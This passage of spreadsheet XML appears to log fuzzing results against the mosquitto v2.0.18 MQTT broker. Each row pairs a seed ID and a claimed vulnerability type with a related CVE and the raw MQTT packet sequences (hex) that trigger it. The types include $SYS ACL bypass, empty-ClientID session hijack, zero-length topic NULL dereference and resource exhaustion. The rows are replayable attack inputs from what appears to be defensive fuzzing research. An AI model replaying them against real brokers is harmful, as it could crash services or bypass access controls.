      <c r="D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DATA提取出来(71B)\u000a4.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0x028e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E41" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:028e ===\u000a大小: 5040B (报告+请求数据)\u000a请求数据: 71B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(71B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=344 Topics=['$SYS/+romperatureeb\x02\x00\x14À\x00e\x00\x82\x0b\x00'(QoS=1), 'testF#'(QoS=0)] | raw_header=82450158001d245359532f2b726f6d70</f>
        <v/>
      </c>
      <c r="F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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J4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4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42">
      <c r="A42" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B42" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C42" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(4777B)\u000a4.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42" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 5122B (报告+请求数据)\u000a请求数据: 4777B\u000a\u000a---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MQTT请求序列(4777B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: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raw_header=26262626262626262626262626262626\u000a(尾部3477B): 2626262626263026262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J4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42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3">
      <c r="A43" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B43" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C43" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(291B)\u000a4.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43" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 5252B (报告+请求数据)\u000a请求数据: 291B\u000a\u000a---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CVE=N/A)\u000a\u000a--- MQTT请求序列(291B原始二进制) ---\u000aMsg[1]: (不完整,291B) raw=b5e5ce01a357f5cde5e826262626262626262626262626262626262626262626262626269c262626\u000a(尾部291B): b5e5ce01a357f5cde5e826262626262626262626262626262626262626262626262626269c26262626262626260c26262626</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A44" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B44" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C44" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(1572B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E44" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 3409B (报告+请求数据)\u000a请求数据: 1572B\u000a\u000a---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MQTT请求序列(1572B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1441 Topics=['$share/gI/èkmeK=/tem\x1c+share/'(QoS=3)] | raw_header=824005a1001c2473686172652f67492f\u000aMsg[2]: PUBREL PacketID=27749 | raw_header=632f6c6576656c312f6c6576656c322f\u000aMsg[3]: PUBREL PacketID=28773 | raw_header=656d706572617475726573742f230234\u000aMsg[4]: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raw_header=65656565656565656565656565656565\u000aMsg[8]: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raw_header=65656565656565656565656565656565\u000aMsg[12]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[13]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565016565\u000aMsg[14]: PUBREL PacketID=25957 | raw_header=65656565656565656565656d65656565\u000aMsg[15]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[16]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[17]: (不完整,7B) raw=68686868686812\u000a(尾部7B): 68686868686812</f>
        <v/>
      </c>
      <c r="F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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J4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5">
      <c r="A45" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B45" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C45" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(487B)\u000a4.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5" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 1154B (报告+请求数据)\u000a请求数据: 487B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(487B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(83B) clean_session=True keepalive=16384s Will=YES [自动清理会话] | raw_header=104100044d515454052640000000533f\u000aMsg[2]: PUBREL PacketID=25647 | raw_header=632f642f65002b766572792f64656570\u000aMsg[3]: PUBLISH Topic='#' QoS=2 retain=False payload='\u0009\x00\x14$share/grp' | raw_header=34100001230900142473686172652f67\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=322f73656e736f722f23213ca501002b\u000aMsg[5]: PUBREL PacketID=13103 | raw_header=656c332f6c6576656c3400534c01ee02\u000aMsg[6]: (不完整,194B) raw=bcfde10d781a4b40423471db7a8fec3fdb88d0dd00007400000000152473686172652f6772702f74\u000a(尾部194B): bcfde10d781a4b40423471db7a8fec3fdb88d0dd00007400000000152473686172652f6772702f74657323f49a0bbcadac78</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J4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">
      <c r="A46" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B46" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C46" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(1278B)\u000a4.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0x0307\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E46" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0307 ===\u000a大小: 3262B (报告+请求数据)\u000a请求数据: 1278B\u000a\u000a---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MQTT请求序列(1278B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1441 Topics=['$share/g3/home/+/temperature'(QoS=1), '$share/g3/home/+/temperatmmm'(QoS=1)] | raw_header=824005a1001c2473686172652f67332f\u000aMsg[2]: SUBSCRIBE PacketID=167 Topics=['home/+/temperature'(QoS=2), '$share/g3/home/+/temperature'(QoS=1), '$SYS/broker/clients/connected'(QoS=2)] | raw_header=825600a70012686f6d652f2b2f74656d\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=61B | raw_header=385c001d245359532f62726f6b65722f\u000aMsg[4]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[5]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[6]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[7]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[8]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d5f6d6d6d6d6d6d6d6d\u000aMsg[9]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[10]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[11]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[12]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[13]: (不完整,31B) raw=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d75726502107a9fb320000000\u000a(尾部31B): 6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d75726502107a9fb320000000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A47" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B47" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C47" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(148B)\u000a4.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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E47" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 2860B (报告+请求数据)\u000a请求数据: 148B\u000a\u000a---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MQTT请求序列(148B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=101300044d5154540480003c00008000\u000aMsg[2]: SUBSCRIBE PacketID=43392 Topics=['$share/g3/home/+/temperature'(QoS=1), '$share/g3/hoT\x04\x02\x00&lt;\x00\x07fuzz\x00\x00\x00@e'(QoS=2)] | raw_header=8240a980001c2473686172652f67332f\u000aMsg[3]: PUBLISH Topic='a/b/R/d/e' QoS=0 retain=True payload='\x05¢:¼M\x82f\x06]5\x0b¸\x8d´\x06&amp;\x00' | raw_header=391c0009612f622f522f642f6505a23a\u000aMsg[4]: CONNACK  | raw_header=2b00\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['test/ÿ'(QoS=3)] | raw_header=820b00010006746573742fff7f\u000aMsg[6]: PUBLISH Topic='test/F' QoS=2 retain=False payload='\x00\x14date' | raw_header=340e0006746573742f46001464617465</f>
        <v/>
      </c>
      <c r="F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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J4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8">
      <c r="A48" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B48" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C48" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(137B)\u000a4.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0x0386\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E48" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 5060B (报告+请求数据)\u000a请求数据: 137B\u000a\u000a---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MQTT请求序列(137B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c0000044d\u000aMsg[2]: TYPE0  | raw_header=05a1001c2473686172652f67332f686f\u000aMsg[3]: (不完整,78B) raw=73686172652f67332f686f6d652f2b2f746508c700152473686172652f6772702f746573742f746f\u000a(尾部78B): 73686172652f67332f686f6d652f2b2f746508c700152473686172652f6772702f746573742f746f7069639c939393939393</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A49" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B49" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C49" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(255B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E49" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0387 ===\u000a大小: 1385B (报告+请求数据)\u000a请求数据: 255B\u000a\u000a---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CONNECT Proto=QQTú v0 ClientID=''(0B) clean_session=False keepalive=64060s [持久会话] | raw_header=10150004515154fa0000fa3c00000064\u000aMsg[2]: (不完整,232B) raw=00fa3c000000647a5f6333824b0579001224736872622f676d407f4b057900122473686172652f68\u000a(尾部232B): 00fa3c000000647a5f6333824b0579001224736872622f676d407f4b057900122473686172652f686f6d652f2b2f74656d70</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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">
      <c r="A50" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:3,cat:03c5</t>
        </is>
      </c>
      <c r="B50" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C50" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000009,sev:3,cat:03c5)中的REQUEST DATA提取出来(614B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E50" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:03c5 ===\u000a大小: 3677B (报告+请求数据)\u000a请求数据: 614B\u000a\u000a---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MQTT请求序列(614B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=9766 Topics=[] | raw_header=82262626472626261e26262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626202626\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[6]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[7]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[9]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[11]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[12]: (不完整,57B) raw=6c6e65745f0b000100067463301a0b00010006616573742f2300824c097a000d3902bac3e05c7ce5\u000a(尾部57B): 6c6e65745f0b000100067463301a0b00010006616573742f2300824c097a000d3902bac3e05c7ce5ee719b08bb8ca5090bd9</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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1">
      <c r="A51" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B51" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C51" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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1" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 1058B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(不完整,60B) raw=80a23900330000152473686172652f6772702f746573742f746f706963001d245359532f62726f6b\u000a(尾部60B): 80a23900330000152473686172652f6772702f746573742f746f706963001d245359532f62726f6b65722f636c69656e7473</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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2">
      <c r="A52" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B52" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C52" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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2" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 1376B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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MQTT请求序列(120B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1730 Topics=[''(零长度!QoS=3)] | raw_header=821106c200000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=77B | raw_header=34620013245359532f62726f6b65722f\u000aMsg[3]: UNSUBACK  | raw_header=b3</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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3">
      <c r="A53" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B53" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C53" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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3" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 2101B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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PUBREC PacketID=22351 | raw_header=5245574f434f4e4e4543540a10130004\u000aMsg[2]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[3]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=0)] | raw_header=8212000200000000e3e3e3e3e3e3e3e3\u000aMsg[4]: TYPE0  | raw_header=020200e0\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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4">
      <c r="A54" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B54" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C54" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(283B)\u000a4.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4" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 994B (报告+请求数据)\u000a请求数据: 283B\u000a\u000a---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MQTT请求序列(283B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=427 Topics=[''(零长度!QoS=3)] | raw_header=825301ab00002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=159B | raw_header=33be01001d245359532f62726f6b6572\u000aMsg[3]: (不完整,5B) raw=00929a4900\u000a(尾部5B): 00929a4900</f>
        <v/>
      </c>
      <c r="F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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5">
      <c r="A55" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B55" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C55" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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5" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 912B (报告+请求数据)\u000a请求数据: 322B\u000a\u000a---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MQTT请求序列(322B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00000001\u000aMsg[2]: SUBSCRIBE PacketID=289 Topics=['$sha\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=82280121001524736861000000000000\u000aMsg[3]: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raw_header=0000\u000a(尾部213B): 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000072652f677270</f>
        <v/>
      </c>
      <c r="F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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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6">
      <c r="A56" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B56" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C56" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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6" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 766B (报告+请求数据)\u000a请求数据: 42B\u000a\u000a---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MQTT请求序列(42B原始二进制) ---\u000aMsg[1]: (不完整,42B) raw=824005a1001c247368617265000961666c6e0402003c000766757a7a5f236573742f230000016202\u000a(尾部42B): 824005a1001c247368617265000961666c6e0402003c000766757a7a5f236573742f2300000162020bf4</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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7">
      <c r="A57" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B57" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C57" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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7" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 954B (报告+请求数据)\u000a请求数据: 84B\u000a\u000a---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MQTT请求序列(84B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: SUBSCRIBE PacketID=1572 Topics=[''(零长度!QoS=0), 'test/topic'(QoS=2)] | raw_header=82120624000000000a746573742f746f\u000aMsg[6]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x06%s5@\x0e\x13\x93âÄY5ûJÆí\x16-\x82\x1b\x8e' | raw_header=3234001d245359532f62726f6b65722f\u000aMsg[7]: PUBREC  | raw_header=5f00</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A58" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B58" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C58" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(103B)\u000a4.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8" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 2579B (报告+请求数据)\u000a请求数据: 103B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: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MQTT请求序列(103B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=101300044d5154540480003c00008000\u000aMsg[2]: SUBSCRIBE PacketID=28736 Topics=['$snsor/+/temp\x00,\x17\x00\x11sensorMQTT'(QoS=0), ''(零长度!QoS=0), 'persistent_01'(QoS=2)] | raw_header=82407040001c24736e736f722f2b2f74\u000aMsg[3]: (不完整,16B) raw=34742f6f6e00053170020005c000e040\u000a(尾部16B): 34742f6f6e00053170020005c000e040</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A59" s="2" t="inlineStr">
        <is>
